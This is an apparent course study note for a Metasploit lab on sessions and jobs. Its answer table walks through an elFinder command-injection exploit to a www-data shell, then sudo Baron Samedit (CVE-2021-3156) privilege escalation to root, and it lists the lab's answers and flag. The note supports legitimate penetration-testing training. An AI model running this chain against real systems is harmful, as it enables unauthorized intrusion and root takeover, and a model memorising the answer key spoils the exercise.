# LAB — Sessions & Jobs

## ID
609

## Module
Using the Metasploit Framework

## Kind
lab

## Title
Section 10 — Sessions & Jobs

## Description
Backgrounding active sessions, binding follow-on modules to a `SESSION` id, and using local-exploit chains for privilege escalation. Lab walks elFinder RCE → backgrounded shell → `sudo_baron_samedit` (CVE-2021-3156) priv-esc.

## Tags
metasploit, sessions, jobs, background, bg, post-exploitation, privilege-escalation, elfinder, sudo-baron-samedit, cve-2021-3156

## Commands
- `background` / `bg` (or `[CTRL]+[Z]`)
- `sessions` — list active sessions
- `sessions -i <id>` — interact with / re-enter session
- `set SESSION <id>` — bind a post/local module to a parked session
- `jobs -h` — jobs help menu
- `jobs -l` — list running jobs
- `jobs -i <id>` — detailed info on a job
- `jobs -k <id>` — kill a specific job (range supported)
- `jobs -K` — kill all running jobs
- `jobs -p <id>` / `jobs -P` — persist a job (or all) on MSF restart
- `exploit -j` / `run -j` — run module in the context of a job (background)
- `exploit -J` — force foreground even if passive
- `search elFinder`
- `search CVE-2021-3156`
- `search sudo baron samedit`
- `search sudo cve:2021`
- `set LHOST tun0`
- `set LPORT 9001`
- `set RHOSTS <ip>`
- `exploit` / `run`

## Concept Overview
MSFconsole tracks two parallel concepts: **Sessions** (live comms channels to compromised hosts) and **Jobs** (background tasks/handlers running inside msf itself). Each successful exploit opens a session (Meterpreter or shell) addressed by a numeric id. `background`/`bg` parks the session so you can return to the `msf6 >` prompt and launch other modules — most importantly post-exploitation modules that take a `SESSION` option to bind to an existing foothold. Jobs are different: they're the msf-side workers (e.g. a `multi/handler` listening on a port). Backgrounding a session keeps the channel alive on the target; turning an exploit into a job keeps the handler alive on your side even if no session is currently using it.

## Sessions
- Background a live session with `background` (Meterpreter) or `[CTRL]+[Z]` → confirmation prompt → back at `msf6 >`.
- `sessions` lists every active session: `Id | Name | Type | Information | Connection`.
- `sessions -i <id>` resumes interaction.
- Sessions can **die** if the payload runtime breaks (process killed, network drop) — the comms channel tears down silently.
- Post-exploitation modules (cred gatherers, local-exploit-suggester, internal scanners) live under `post/` and require `set SESSION <id>` to attach to a parked session.

## Jobs
- Running an exploit normally (`exploit` / `run`) ties up the foreground prompt. `exploit -j` runs it "in the context of a job" — handler keeps listening, prompt returns immediately.
- `[CTRL]+[C]` on a foreground exploit **does not free the port** if a handler is still registered as a job — you'll get port-in-use errors on the next module. Use `jobs -l` then `jobs -k <id>` (or `jobs -K` for all).
- `jobs -i <id>` shows full job detail; `-v` adds verbose info; `-p`/`-P` makes a job survive `msfconsole` restarts.
- Jobs persist independently of any one session — a handler-job will accept the next callback even if the session it spawned died.

## Workflow Pattern (chain → priv-esc)
1. Get an initial foothold with an exploit module → session 1 opens.
2. `background` to return to `msf6 >`.
3. `search <next-module>` and `use <id>`.
4. `set SESSION 1` (bind to the parked session).
5. Set any other required options (`LHOST`, `LPORT` — change LPORT if 4444 is busy).
6. `exploit` → new session opens with elevated privileges.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Name of the web application running on the target. | **elFinder** | View the HTML source of the target's web root — app identified there |
| Q2 — Username of the shell obtained via the existing MSF exploit. | **www-data** | `search elFinder` → `use 3` (`exploit/linux/http/elfinder_archive_cmd_injection`) → `set LHOST tun0` → `set RHOSTS <ip>` → `exploit` → drop to `shell` → `whoami` |
| Q3 — Get root via the old sudo version. Submit `flag.txt` contents. | **HTB{5e55ion5_4r3_sw33t}** | From shell, `sudo -V` shows `Sudo 1.8.31` → `background` → `search CVE-2021-3156` → `use 0` (`exploit/linux/local/sudo_baron_samedit`) → `set LHOST tun0` → `set LPORT 9001` → `set SESSION 1` → `exploit` → `cat /root/flag.txt` |

## Key Takeaways
- `background` (or `bg`) is the difference between losing your shell and chaining the next module against it — get into the habit before reaching for any new `use`.
- `SESSION` is just the integer id from the original `[*] Meterpreter session 1 opened` line — `sessions` lists them all if you forget.
- If you already have a session listening on 4444, **change `LPORT`** on the follow-on module (the lab uses 9001) — two handlers on the same port collide.
- Sessions ≠ Jobs: a session is the channel to the *target*; a job is a worker on *your* msf side. Killing one doesn't always free the other — check both.
- `exploit -j` is the right call any time you want the handler to stay up while you keep working at the `msf6 >` prompt (multi-host attacks, repeated callbacks).
- Always check the running version of utilities you reach (e.g. `sudo -V`) — old Sudo is a recurring priv-esc gift (CVE-2021-3156 / Baron Samedit hits 1.8.31).

## Gotchas
- The privilege-escalation module may print a compatibility warning like `SESSION may not be compatible with this module: incompatible session architecture`. It often still works — read the rest of the output before bailing.
- `local_exploit_suggester` results that say "The service is running, but could not be validated" are *maybes*, not yeses — try them but don't stop at the first hit.
- `[CTRL]+[C]` looks like it terminates the handler but the **job often survives** — port stays bound. Always `jobs -l` after a clean-up and `jobs -k <id>` if anything's still there.
- Meterpreter doesn't have native `whoami` — drop to `shell` first (or use `getuid` from inside meterpreter).

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[09-plugins-and-mixins]] | [[11-meterpreter]] →
<!-- AUTO-LINKS-END -->
